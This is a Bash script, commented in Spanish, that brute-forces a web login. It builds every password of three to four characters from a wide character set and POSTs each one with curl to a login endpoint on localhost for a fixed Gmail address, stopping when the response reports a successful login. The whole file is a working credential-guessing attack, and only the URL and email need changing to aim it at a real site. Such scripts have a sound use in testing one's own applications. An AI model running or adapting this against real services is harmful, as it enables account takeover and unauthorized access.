#!/bin/bash


URL="http://127.0.0.1:8000/login"
CORREO="theo@gmail.com"
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>/?"
INTENTOS=0

# Genera todas las combinaciones alfanuméricas de longitud fija
generate_combinations() {
    local length=$1
    local total=${#CHARS}
    local indices=()

    # Inicializa los índices en 0
    for ((i=0; i<length; i++)); do
        indices[i]=0
    done

    while true; do
        # Construye la contraseña actual
        password=""
        for ((i=0; i<length; i++)); do
            password+="${CHARS:${indices[i]}:1}"
        done

        # Incrementa contador de intentos
        ((INTENTOS++))

        # Intenta login
        response=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"correo\": \"$CORREO\", \"password\": \"$password\"}")

        if [[ "$response" == *"Login exitoso"* ]]; then
            echo "✅ ¡Contraseña encontrada!: $password"
            echo "🔢 Total de intentos: $INTENTOS"
            exit 0
        fi

        # Incrementa los índices
        for ((i=length-1; i>=0; i--)); do
            if (( indices[i] < total - 1 )); then
                ((indices[i]++))
                break
            else
                indices[i]=0
                if (( i == 0 )); then
                    return  # Se agotaron todas las combinaciones
                fi
            fi
        done
    done
}

# Fuerza bruta desde longitud 3 hasta 4 (puedes ampliar si quieres)
for len in {3..4}; do
    echo "🔍 Probando contraseñas de longitud $len..."
    generate_combinations "$len"
done

echo "❌ Contraseña no encontrada en el rango especificado."
echo "🔢 Total de intentos: $INTENTOS"
